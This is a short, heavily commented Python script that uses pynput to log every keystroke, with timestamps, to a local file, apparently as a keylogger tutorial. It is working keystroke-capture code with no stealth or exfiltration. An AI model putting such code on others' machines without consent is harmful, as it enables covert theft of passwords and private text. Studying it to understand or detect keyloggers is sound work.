import logging
from pynput import keyboard            # pynput, used to capture keyboard events

log_dir = "Log Files/"    # variable stores the directory path where the log file will be saved

# line configures the Python logging system
#    filename: Specifies the log file's location, combining the log_dir with the filename "keyLog.txt."
#    level: Sets the logging level to DEBUG, which means that all log messages will be captured.
#    format: Specifies the log message format, including a timestamp and the actual log message.
logging.basicConfig(filename=log_dir + "/keyLog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))    # converts the key to a string and logs it

listener = keyboard.Listener(on_press=on_press)    # creates an instance of keyboard.Listener and specifies the on_press function as the event handler for key presses
listener.start()    # capturing keyboard events
listener.join()    # line blocks the main thread and waits until the listener is stopped. listener runs in the background and processes keypress events
